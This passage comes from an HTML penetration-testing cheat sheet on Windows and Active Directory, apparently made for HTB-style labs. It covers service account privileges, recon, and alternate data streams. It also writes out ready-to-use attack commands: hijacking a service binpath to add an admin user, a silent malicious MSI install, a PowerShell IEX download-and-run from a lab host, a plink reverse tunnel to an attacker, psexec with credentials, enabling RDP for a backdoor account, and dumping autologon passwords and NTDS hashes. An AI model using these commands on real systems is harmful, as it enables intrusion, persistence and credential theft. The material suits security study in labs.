<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx</a></li>
<li>Very high-privileged built-in account.</li>
<li>Extensive privileges on the local system and acts as the computer on the network. </li>
<li>The actual name of the account is <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="k">SYSTEM</span></code>.</li>
<li>Not recognized by the security subsystem, so you cannot specify its name in a call to the <code class="codehilite"><span class="n">LookupAccountName</span></code> function. </li>
<li>Has extensive privileges on the local computer, and acts as the computer on the network. </li>
<li>Its token includes the <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="k">SYSTEM</span></code> and <code class="codehilite"><span class="n">BUILTIN</span><span class="err">\</span><span class="n">Administrators</span></code> SIDs; these accounts have access to most system objects. </li>
<li>The name of the account in all locales is <code class="codehilite"><span class="p">.</span><span class="err">\</span><span class="n">LocalSystem</span></code>. </li>
<li>The name, <code class="codehilite"><span class="n">LocalSystem</span></code> or <code class="codehilite"><span class="n">ComputerName</span><span class="err">\</span><span class="n">LocalSystem</span></code> can also be used. </li>
<li>This account does not have a password. </li>
<li>If you specify the <code class="codehilite"><span class="n">LocalSystem</span></code> account in a call to the <code class="codehilite"><span class="n">CreateService</span></code> or <code class="codehilite"><span class="n">ChangeServiceConfig</span></code> function, any password information you provide is ignored.</li>
<li>The service can open the registry key HKEY_LOCAL_MACHINE\SECURITY.</li>
<li>The service presents the computer's credentials to remote servers.</li>
<li>If the service opens a command window and runs a batch file, the user could hit CTRL+C to terminate the batch file and gain access to a command window with LocalSystem permissions.</li>
<li>A service that runs in the context of the <code class="codehilite"><span class="n">LocalSystem</span></code> account inherits the security context of the SCM. The user SID is created from the <code class="codehilite"><span class="n">SECURITY_LOCAL_SYSTEM_RID</span></code> value. </li>
<li>Has:<ul>
<li>E_ASSIGNPRIMARYTOKEN_NAME (disabled)</li>
<li>SE_AUDIT_NAME (enabled)</li>
<li>SE_BACKUP_NAME (disabled)</li>
<li>SE_CHANGE_NOTIFY_NAME (enabled)</li>
<li>SE_CREATE_GLOBAL_NAME (enabled)</li>
<li>SE_CREATE_PAGEFILE_NAME (enabled)</li>
<li>SE_CREATE_PERMANENT_NAME (enabled)</li>
<li>SE_CREATE_TOKEN_NAME (disabled)</li>
<li>SE_DEBUG_NAME (enabled)</li>
<li>SE_IMPERSONATE_NAME (enabled)</li>
<li>SE_INC_BASE_PRIORITY_NAME (enabled)</li>
<li>SE_INCREASE_QUOTA_NAME (disabled)</li>
<li>SE_LOAD_DRIVER_NAME (disabled)</li>
<li>SE_LOCK_MEMORY_NAME (enabled)</li>
<li>SE_MANAGE_VOLUME_NAME (disabled)</li>
<li>SE_PROF_SINGLE_PROCESS_NAME (enabled)</li>
<li>SE_RESTORE_NAME (disabled)</li>
<li>SE_SECURITY_NAME (disabled)</li>
<li>SE_SHUTDOWN_NAME (disabled)</li>
<li>SE_SYSTEM_ENVIRONMENT_NAME (disabled)</li>
<li>SE_SYSTEMTIME_NAME (disabled)</li>
<li>SE_TAKE_OWNERSHIP_NAME (disabled)</li>
<li>SE_TCB_NAME (enabled)</li>
<li>SE_UNDOCK_NAME (disabled)</li>
</ul>
</li>
</ul>
</li>
<li>LocalService account is a predefined local account used by the service control manager.<ul>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx</a></li>
<li>Has the <strong>same level</strong> of access to resources and objects as members of the <code class="codehilite"><span class="n">Users</span></code> group. </li>
<li>This limited access helps safeguard the system if individual services or processes are compromised.</li>
<li>Services that run as the <code class="codehilite"><span class="k">Local</span> <span class="n">Service</span></code> account access network resources as a <code class="codehilite"><span class="k">null</span> <span class="k">session</span></code> without credentials. </li>
<li><code class="codehilite"><span class="k">Local</span> <span class="n">Service</span></code> account is not supported for the <code class="codehilite"><span class="k">SQL</span> <span class="n">Server</span></code> or <code class="codehilite"><span class="k">SQL</span> <span class="n">Server</span> <span class="n">Agent</span></code> services. </li>
<li>The actual name of the account is <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="k">LOCAL</span> <span class="n">SERVICE</span></code>.</li>
<li>Not recognized by the security subsystem, so you cannot specify its name in a call to the <code class="codehilite"><span class="n">LookupAccountName</span></code> function. </li>
<li>Has minimum privileges on the local computer and presents anonymous credentials on the network.</li>
<li>Can be specified in a call to the <code class="codehilite"><span class="n">CreateService</span></code> and <code class="codehilite"><span class="n">ChangeServiceConfig</span></code> functions. </li>
<li>This account does not have a password, so any password information that you provide in this call is ignored. </li>
<li>While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the <code class="codehilite"><span class="n">LookupAccountSid</span></code> function, but the name of the account must be <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="n">LocalService</span></code> when you call <code class="codehilite"><span class="n">CreateService</span></code> or <code class="codehilite"><span class="n">ChangeServiceConfig</span></code>, regardless of the locale, or unexpected results can occur.</li>
<li>The LocalService account has its own subkey under the HKEY_USERS registry key. Therefore, the <code class="codehilite"><span class="n">HKEY_CURRENT_USER</span></code> registry key is associated with the LocalService account.</li>
<li>Has:<ul>
<li>SE_ASSIGNPRIMARYTOKEN_NAME (disabled)</li>
<li>SE_AUDIT_NAME (disabled)</li>
<li>SE_CHANGE_NOTIFY_NAME (enabled)</li>
<li>SE_CREATE_GLOBAL_NAME (enabled)</li>
<li>SE_IMPERSONATE_NAME (enabled)</li>
<li>SE_INCREASE_QUOTA_NAME (disabled)</li>
<li>SE_SHUTDOWN_NAME (disabled)</li>
<li>SE_UNDOCK_NAME (disabled)</li>
<li>Any privileges assigned to users and authenticated users</li>
</ul>
</li>
</ul>
</li>
<li>NetworkService account is a predefined local account used by the service control manager. <ul>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx</a></li>
<li>Has <strong>more</strong> access to resources and objects than members of the <code class="codehilite"><span class="n">Users</span></code> group. </li>
<li>Services that run as the <code class="codehilite"><span class="n">Network</span> <span class="n">Service</span></code> account access network resources by using the <code class="codehilite"><span class="n">credentials</span> <span class="k">of</span> <span class="n">the</span> <span class="n">computer</span> <span class="n">account</span></code>. </li>
<li>The actual name of the account is <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="n">NETWORK</span> <span class="n">SERVICE</span></code>.</li>
<li>Not recognized by the security subsystem, so you cannot specify its name in a call to the <code class="codehilite"><span class="n">LookupAccountName</span></code> function. </li>
<li>Has minimum privileges on the local computer and acts as the computer on the network.</li>
<li>This account can be specified in a call to the <code class="codehilite"><span class="n">CreateService</span></code> and <code class="codehilite"><span class="n">ChangeServiceConfig</span></code> functions. </li>
<li>This account does not have a password, so any password information that you provide in this call is ignored. </li>
<li>While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the <code class="codehilite"><span class="n">LookupAccountSid</span></code> function, but the name of the account must be <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="n">NetworkService</span></code> when you call <code class="codehilite"><span class="n">CreateService</span></code> or <code class="codehilite"><span class="n">ChangeServiceConfig</span></code>, regardless of the locale, or unexpected results can occur.</li>
<li>A service that runs in the context of the <code class="codehilite"><span class="n">NetworkService</span></code> account presents the computer's credentials to remote servers. By default, the remote token contains SIDs for the Everyone and Authenticated Users groups. The user SID is created from the <code class="codehilite"><span class="n">SECURITY_NETWORK_SERVICE_RID</span></code> value.</li>
<li>Has its own subkey under the <code class="codehilite"><span class="n">HKEY_USERS</span></code> registry key. Therefore, the <code class="codehilite"><span class="n">HKEY_CURRENT_USER</span></code> registry key is associated with the NetworkService account.</li>
<li>Has:<ul>
<li>SE_ASSIGNPRIMARYTOKEN_NAME (disabled)</li>
<li>SE_AUDIT_NAME (disabled)</li>
<li>SE_CHANGE_NOTIFY_NAME (enabled)</li>
<li>SE_CREATE_GLOBAL_NAME (enabled)</li>
<li>SE_IMPERSONATE_NAME (enabled)</li>
<li>SE_INCREASE_QUOTA_NAME (disabled)</li>
<li>SE_SHUTDOWN_NAME (disabled)</li>
<li>SE_UNDOCK_NAME (disabled)</li>
<li>Any privileges assigned to users and authenticated users</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Convert string to little-endian: <code class="codehilite"><span class="n">iconv</span> <span class="o">-</span><span class="k">to</span><span class="o">-</span><span class="n">code</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">16</span><span class="n">LE</span></code><ul>
<li>Should be done before base64 encoding for <code class="codehilite"><span class="o">-</span><span class="n">ExecuteCommand</span></code> in powershell</li>
</ul>
</li>
<li>Enumeration Tips<ul>
<li>Ref: <a href="https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/">https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/</a></li>
<li>Check the <code class="codehilite"><span class="n">policies</span></code> related to <code class="codehilite"><span class="n">Network</span> <span class="k">Access</span> <span class="n">Control</span></code>. Whether it can be bypassed or not.</li>
<li>Go for <code class="codehilite"><span class="n">guest</span> <span class="n">wifi</span></code>. It could lead you to get inside the company network if it is not segregated.</li>
<li>Check for the <code class="codehilite"><span class="n">printers</span></code> in the environment. Try to do printer exploitation. Printers are part of domain network too. Try default passwords.</li>
<li>Check for <code class="codehilite"><span class="n">misconfigurations</span></code> in the systems as well as the network.</li>
<li>At the Domain level, always look for <code class="codehilite"><span class="n">Administrators</span></code> group members instead of going just for <code class="codehilite"><span class="k">Domain</span> <span class="n">Admins</span></code>. Reason being Builtin Administrators group is the superior one. Even "Domain Admins" group is also the member of administrators groups.</li>
<li>Look for User <code class="codehilite"><span class="n">Rights</span> <span class="n">Assignments</span></code> in the <code class="codehilite"><span class="n">GPOs</span></code>. They get checked very rarely. The ones which are configured for Domain Controllers actually have domain rights.</li>
<li>Most of the organizations use the <code class="codehilite"><span class="nv">same</span> <span class="nv">image</span> <span class="k">for</span> <span class="nv">all</span> <span class="nv">of</span> <span class="nv">their</span> <span class="nv">deployments</span></code>. Which means they use <code class="codehilite"><span class="n">same</span> <span class="k">local</span> <span class="k">admin</span> <span class="n">password</span></code>. Always check if same local admin account is being used in whole domain.</li>
<li>Identify <code class="codehilite"><span class="k">Admin</span> <span class="n">Restrictions</span></code>. (Logon Hours, LogonWorkstations) Decoys can be detected using this.</li>
<li>Use <code class="codehilite"><span class="n">Responder</span> <span class="k">to</span> <span class="n">collect</span> <span class="n">NTLM</span> <span class="n">hashes</span></code>.</li>
<li>Check <a href="https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx">SYSVOL</a> too.</li>
<li><code class="codehilite"><span class="n">ShareEnum</span></code> to look for file shares.</li>
</ul>
</li>
<li>Recon<ul>
<li>IP, subnet, default gateway etc: <code class="codehilite"><span class="n">ipconfig</span> <span class="o">/</span><span class="k">all</span></code></li>
<li>Current user name, info in current access token, SID, privs and group that current user belongs to: <code class="codehilite"><span class="n">whoami</span> <span class="o">/</span><span class="k">all</span></code></li>
<li>Local groups on current machine: <code class="codehilite"><span class="n">net</span> <span class="n">localgroup</span></code></li>
<li>Local administrators of current machine: <code class="codehilite"><span class="n">net</span> <span class="n">localgroup</span> <span class="ss">&quot;administrators&quot;</span></code></li>
<li>Active tcp connections, ports, which the computer is listening, ethernet statistics, ip routing table: <code class="codehilite"><span class="n">netstat</span> <span class="o">-</span><span class="n">an</span></code></li>
<li>Running processes with verbose mode: <code class="codehilite"><span class="n">tasklist</span> <span class="o">/</span><span class="n">V</span></code></li>
<li>Startup programs: <code class="codehilite"><span class="n">net</span> <span class="k">start</span></code></li>
<li>Windows services with binary paths: <code class="codehilite"><span class="n">sc</span> <span class="n">qc</span> <span class="o">&lt;</span><span class="n">service</span><span class="o">&gt;</span></code></li>
<li>OS, processor, memory, bios related info: <code class="codehilite"><span class="n">systeminfo</span><span class="o">&gt;</span><span class="k">output</span><span class="p">.</span><span class="n">txt</span></code></li>
<li>Scheduled jobs: <code class="codehilite"><span class="n">schtasks</span> <span class="o">/</span><span class="n">query</span> <span class="o">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="o">/</span><span class="n">v</span></code></li>
<li>Patches installed and figuring out if its missing important any patch: <code class="codehilite"><span class="n">wmic</span> <span class="n">qfe</span> <span class="k">get</span> <span class="n">Caption</span><span class="p">,</span><span class="n">Description</span><span class="p">,</span><span class="n">HotFixID</span><span class="p">,</span><span class="n">InstalledOn</span></code></li>
</ul>
</li>
<li>Domain Network Recon<ul>
<li>Mapping of IP address to its MAC address in the network: <code class="codehilite"><span class="n">arp</span> <span class="o">-</span><span class="n">a</span></code></li>
<li>Domain: <code class="codehilite"><span class="n">echo</span> <span class="o">%</span><span class="n">USERDOMAIN</span><span class="o">%</span></code></li>
<li>Domain controller name: <code class="codehilite"><span class="n">echo</span> <span class="o">%</span><span class="n">logonserver</span><span class="o">%</span></code></li>
<li>List of domain users: <code class="codehilite"><span class="n">net</span> <span class="k">user</span> <span class="o">/</span><span class="k">domain</span></code></li>
<li>List of groups in the domain: <code class="codehilite"><span class="n">net</span> <span class="k">group</span> <span class="o">/</span><span class="k">domain</span></code></li>
<li>AD domain password policy: <code class="codehilite"><span class="n">net</span> <span class="n">accounts</span> <span class="o">/</span><span class="k">domain</span></code></li>
<li>Map AD trust relationships: <code class="codehilite"><span class="n">nltest</span> <span class="o">/</span><span class="n">domain_trusts</span></code></li>
</ul>
</li>
<li>Alternate Data Stream (ADS)<ul>
<li>Listing: <code class="codehilite"><span class="n">dir</span> <span class="o">/</span><span class="n">R</span></code></li>
<li>Find Streams: <code class="codehilite"><span class="err">​</span><span class="k">get</span><span class="o">-</span><span class="n">item</span> <span class="o">-</span><span class="n">path</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span> <span class="o">-</span><span class="n">stream</span> <span class="o">*</span></code></li>
<li>Reading: <code class="codehilite"><span class="err">​</span><span class="n">powershell</span> <span class="k">Get</span><span class="o">-</span><span class="n">Content</span> <span class="o">-</span><span class="n">Path</span> <span class="ss">&quot;hm.txt&quot;</span> <span class="o">-</span><span class="n">Stream</span> <span class="ss">&quot;root.txt&quot;</span></code></li>
<li>Reading: <code class="codehilite"><span class="k">get</span><span class="o">-</span><span class="n">content</span> <span class="n">backup</span><span class="p">.</span><span class="n">zip</span> <span class="o">-</span><span class="n">stream</span> <span class="s1">&#39;pass&#39;</span></code></li>
<li>Reading: <code class="codehilite"><span class="n">streams</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">accepteula</span> <span class="o">-</span><span class="n">s</span></code> from sysinternals</li>
</ul>
</li>
<li>Services<ul>
<li>Registry entries: <code class="codehilite"><span class="n">HKLM</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Services</span></code></li>
<li>View service properties: <code class="codehilite"><span class="n">sc</span> <span class="n">qc</span> <span class="ss">&quot;Vulnerable Service&quot;</span></code> / <code class="codehilite"><span class="n">net</span> <span class="k">start</span></code></li>
<li>Restarting: <code class="codehilite"><span class="n">sc</span> <span class="n">stop</span> <span class="ss">&quot;Vulnerable Service&quot;</span></code> /  <code class="codehilite"><span class="n">net</span> <span class="n">stop</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span></code></li>
<li>Start: <code class="codehilite"><span class="n">sc</span> <span class="k">start</span> <span class="ss">&quot;Vulnerable Service&quot;</span></code> /  <code class="codehilite"><span class="n">net</span> <span class="k">start</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span></code></li>
<li>Service information: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Service</span><span class="err">​</span> <span class="err">​</span> <span class="ss">&quot;Ubiquiti UniFi Video&quot;</span><span class="err">​</span> <span class="o">|</span> <span class="n">fl</span> <span class="o">*</span></code></li>
<li>Restart PC: <code class="codehilite"><span class="n">shutdown</span> <span class="o">/</span><span class="n">r</span> <span class="o">/</span><span class="n">t</span> <span class="mi">0</span></code></li>
<li>Change binary path: <code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="ss">&quot;Vulnerable Service&quot;</span> <span class="n">binpath</span><span class="o">=</span> <span class="err">&quot;</span><span class="n">net</span> <span class="k">user</span> <span class="n">eviladmin</span> <span class="n">P4ssw0rd</span><span class="o">@</span> <span class="o">/</span><span class="k">add</span></code></li>
<li>Disable: <code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="n">servicename</span> <span class="k">start</span><span class="o">=</span> <span class="n">disabled</span></code></li>
<li>Enable: <code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="n">servicename</span> <span class="k">start</span><span class="o">=</span> <span class="n">demand</span></code></li>
<li>Auto: <code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="n">servicename</span> <span class="k">start</span><span class="o">=</span> <span class="n">auto</span></code></li>
<li>Keep alive - When a service starts in Windows operating systems, it must communicate with the <code class="codehilite"><span class="n">Service</span> <span class="n">Control</span> <span class="n">Manager</span></code>. If it's not, <code class="codehilite"><span class="n">Service</span> <span class="n">Control</span> <span class="n">Manager</span></code> will terminates the process.</li>
</ul>
</li>
<li>Installing MSI
    <div class="codehilite"><pre><span></span><span class="n">msiexec</span> <span class="o">/</span><span class="n">quiet</span> <span class="o">/</span><span class="n">qn</span> <span class="o">/</span><span class="n">i</span> <span class="n">malicious</span><span class="p">.</span><span class="n">msi</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="o">/</span><span class="n">quiet</span> <span class="o">=</span> <span class="n">Suppress</span> <span class="k">any</span> <span class="n">messages</span> <span class="k">to</span> <span class="n">the</span> <span class="k">user</span> <span class="n">during</span> <span class="n">installation</span>
<span class="o">/</span><span class="n">qn</span> <span class="o">=</span> <span class="k">No</span> <span class="n">GUI</span>
<span class="o">/</span><span class="n">i</span> <span class="o">=</span> <span class="n">Regular</span> <span class="p">(</span><span class="n">vs</span><span class="p">.</span> <span class="n">administrative</span><span class="p">)</span> <span class="n">installation</span>
</pre></div></li>
<li>Extract ZIP
    <div class="codehilite"><pre><span></span><span class="nb">Add-Type</span> <span class="n">-assembly</span>
<span class="s1">&#39;system.io.compression.filesystem&#39;</span><span class="p">;</span><span class="no">[io.compression.zipfile]</span><span class="p">::</span><span class="n">ExtractToDirectory</span>
<span class="p">(</span><span class="s2">&quot;C:\backup.zip&quot;</span><span class="p">,</span><span class="s2">&quot;C:\Example\&quot;</span><span class="p">)</span>
</pre></div></li>
<li>View File Systems
    <div class="codehilite"><pre><span></span><span class="n">gdr</span> <span class="o">-</span><span class="n">PSProvider</span> <span class="s1">&#39;FileSystem&#39;</span>
</pre></div></li>
<li>Access shared volume
    <div class="codehilite"><pre><span></span><span class="n">net</span> <span class="n">use</span> <span class="n">y</span><span class="p">:</span> <span class="err">\\</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">57</span><span class="err">\</span><span class="k">c</span><span class="err">$</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">administrator</span> <span class="mi">1234</span><span class="n">test</span>
</pre></div></li>
<li>Open password protected share
    <div class="codehilite"><pre><span></span><span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="n">server</span><span class="p">\</span><span class="n">share</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">test</span> <span class="n">testpassword</span>
<span class="nb">start </span><span class="p">\\</span><span class="n">server</span><span class="p">\</span><span class="n">share</span>
</pre></div></li>
<li>Auto Save Password to PowerShell
    <div class="codehilite"><pre><span></span><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span> <span class="n">2</span><span class="p">&gt;</span><span class="n">nul</span> <span class="p">|</span> <span class="n">findstr</span> <span class="s2">&quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nv">$passwd</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;Welcome1!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span>
<span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;administrator&#39;</span> <span class="nv">$passwd</span><span class="p">)</span><span class="err">​</span>

<span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="s2">&quot;powershell&quot;</span> <span class="n">-argumentlist</span> <span class="s2">&quot;IEX(New-Object Net.webClient).downloadString(&#39;http://&lt;LAB IP&gt;/writeup&#39;)&quot;</span> <span class="n">-Credential</span> <span class="nv">$creds</span>
</pre></div></li>
<li>Permissions: <code class="codehilite"><span class="n">whoami</span> <span class="o">/</span><span class="n">priv</span></code><ul>
<li>View Permisions: <code class="codehilite"><span class="n">cacls</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span></code></li>
<li>Grant Permissions<code class="codehilite"><span class="n">cacls</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span> <span class="o">/</span><span class="k">grant</span> <span class="n">Alfred</span><span class="p">:</span><span class="n">F</span></code>
  <div class="codehilite"><pre><span></span><span class="n">cacls</span> <span class="s2">&quot;c:\users\Administrator\Desktop\root.txt&quot;</span> <span class="p">/</span><span class="n">E</span> <span class="p">/</span><span class="n">P</span> <span class="n">Alfred</span><span class="err">:</span><span class="n">F</span>

<span class="n">cacls</span> <span class="n">Windows</span> <span class="n">utility</span> <span class="n">to</span> <span class="n">view</span><span class="p">/</span><span class="n">edit</span> <span class="n">file</span> <span class="n">permissions</span>
<span class="p">/</span><span class="n">E</span> <span class="n">to</span> <span class="n">edit</span> <span class="n">ACL</span>
<span class="p">/</span><span class="n">P</span> <span class="n">to</span> <span class="nb">set </span><span class="n">permissions</span>
<span class="n">Alfred</span><span class="err">:</span><span class="n">F</span> <span class="n">to</span> <span class="n">give</span> <span class="n">Alfred</span> <span class="n">full</span> <span class="n">control</span> <span class="n">of</span> <span class="n">the</span> <span class="n">file</span>
</pre></div></li>
</ul>
</li>
<li>SSH from Windows to Attacker (Kali)<ul>
<li>Manual<ul>
<li>From Windows: <code class="codehilite"><span class="n">plink</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">l</span> <span class="n">root</span> <span class="o">-</span><span class="n">pw</span>  <span class="o">-</span><span class="n">R</span> <span class="mi">445</span><span class="p">:</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">445</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">14</span><span class="p">.</span><span class="mi">8</span></code></li>
<li>From Attacker:
    <div class="codehilite"><pre><span></span>netstat -ano <span class="p">|</span> grep <span class="m">445</span>
winexe -U Administrator //127.0.0.1 <span class="s2">&quot;cmd.exe&quot;</span>
</pre></div></li>
</ul>
</li>
<li>Metasploit
  <div class="codehilite"><pre><span></span>portfwd add -l <span class="m">445</span> -p <span class="m">445</span> -r <span class="m">127</span>.0.0.1
use exploit/windows/smb/psexec
<span class="nb">set</span> SMBDOMAIN CHATTERBOX
<span class="nb">set</span> SMBUSER Administrators
<span class="nb">set</span> SMBPASS Welcome1!
<span class="nb">set</span> RHOST <span class="m">127</span>.0.0.1
exploit
</pre></div></li>
</ul>
</li>
<li>Add user and enable RDP
    <div class="codehilite"><pre><span></span>net user hacker hacker /add
net localgroup /add Administrators hacker
reg add <span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d <span class="m">0</span> /f
</pre></div></li>
<li><a href="https://stackoverflow.com/questions/23074430/how-to-run-vbscript-from-command-line-without-cscript-wscript">Windows file association</a></li>
</ul>
<h3 id="bypasses">Bypasses<a class="headerlink" href="#bypasses" title="Permanent link">&para;</a></h3>
<ul>
<li>ftp.exe to open processes: <a href="https://twitter.com/yeyint_mth/status/1009732492138442752">https://twitter.com/yeyint_mth/status/1009732492138442752</a></li>
</ul>
<h3 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h3>
<ul>
<li>Patch Extractor : <a href="https://gist.github.com/moshekaplan/e8d16ed91dc3ca53e73145ba3b2baebd">https://gist.github.com/moshekaplan/e8d16ed91dc3ca53e73145ba3b2baebd</a> <a href="https://gist.github.com/anonymous/d55f494982c0097111d3263cf7099c9d">https://gist.github.com/anonymous/d55f494982c0097111d3263cf7099c9d</a></li>
<li>ntdsXtract - Active Directory forensic framework: <a href="https://github.com/csababarta/ntdsxtract">https://github.com/csababarta/ntdsxtract</a><ul>
<li>Extract users from ESE DB export:
  <div class="codehilite"><pre><span></span>dsusers.py kotarak.dit.export/datatable.3 kotarak.dit.export/link_table.5 hashdump --syshive
kotarak.bin --passwordhashes --lmoutfile lmout.txt --ntoutfile ntout.txt --pwdformat ophc
</pre></div></li>
<li>Practice:<ul>
<li>HTB: Kotarak</li>
</ul>
</li>
</ul>
</li>
<li>LibEseDB - library to access the Extensible Storage Engine (ESE) Database File (EDB) format: <a href="https://github.com/libyal/libesedb">https://github.com/libyal/libesedb</a><ul>
<li>The ESE database format is used in may different applications like Windows Search, Windows Mail, Exchange, Active Directory, etc.</li>
<li>Dump tables:
  <div class="codehilite"><pre><span></span><span class="n">esedbexport</span> <span class="o">-</span><span class="n">m</span> <span class="n">tables</span> <span class="mi">20170721114636</span><span class="n">_default_192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">110</span><span class="p">.</span><span class="mi">133</span><span class="n">_psexec</span><span class="p">.</span><span class="n">ntdsgrab</span><span class="p">.</span><span class="n">_333512</span><span class="p">.</span><span class="n">dit</span>  
</pre></div></li>
<li>Practice:<ul>
<li>HTB: Kotarak</li>
</ul>
</li>
</ul>
</li>
<li>WinEXE - remotely executes commands on Windows NT/2000/XP/2003 systems from GNU/Linux (and possibly also from other Unices capable of building the Samba 4 software package): <a href="https://sourceforge.net/projects/winexe/">https://sourceforge.net/projects/winexe/</a></li>
<li>PowerUpSQL: <ul>
<li>Dumping Active Directory Domain Info – with PowerUpSQL!: <a href="https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/">https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/</a></li>
</ul>
</li>
<li>Bloodhound - uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify: <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a><ul>
<li>BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment: <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
<li>Find where domain admins are logged in:
  <div class="codehilite"><pre><span></span><span class="n">python</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">bloodhound</span><span class="p">.</span><span class="n">py</span>  <span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="n">USERNAME</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">p</span> <span class="o">&lt;</span><span class="n">PASSWORD</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">DOMAIN_NAME</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">dc</span> <span class="o">&lt;</span><span class="n">DOMAIN_CONTROLLER_HOSTNAME</span><span class="o">&gt;</span>
<span class="n">neo4j</span> <span class="k">start</span>
<span class="n">bloodhound</span>
</pre></div></li>
</ul>
</li>
<li>LDIFDE: Import/Export information from AD</li>
</ul>
<ul>
<li>Sys Internals: <a href="https://technet.microsoft.com/en-in/sysinternals/bb545021.aspx">https://technet.microsoft.com/en-in/sysinternals/bb545021.aspx</a><ul>
<li><code class="codehilite"><span class="n">PsExec</span></code> - Execute processes on remote machine</li>
<li><code class="codehilite"><span class="n">PsFile</span></code> - Displays list of files opened remotely.</li>
<li><code class="codehilite"><span class="n">PsGetSid</span></code> - Translate SID to display name and vice versa</li>
<li><code class="codehilite"><span class="n">PsKill</span></code> - Kill processes on local or remote machine</li>
<li><code class="codehilite"><span class="n">PsInfo</span></code> - Displays installation, install date, kernel build, physical memory, processors type and number, etc.</li>
<li><code class="codehilite"><span class="n">PsList</span></code> - Displays process, CPU, Memory, thread statistics</li>
<li><code class="codehilite"><span class="n">PsLoggedOn</span></code> - Displays local and remote logged users</li>
<li><code class="codehilite"><span class="n">PsLogList</span></code> - View Event logs</li>
</ul>
</li>
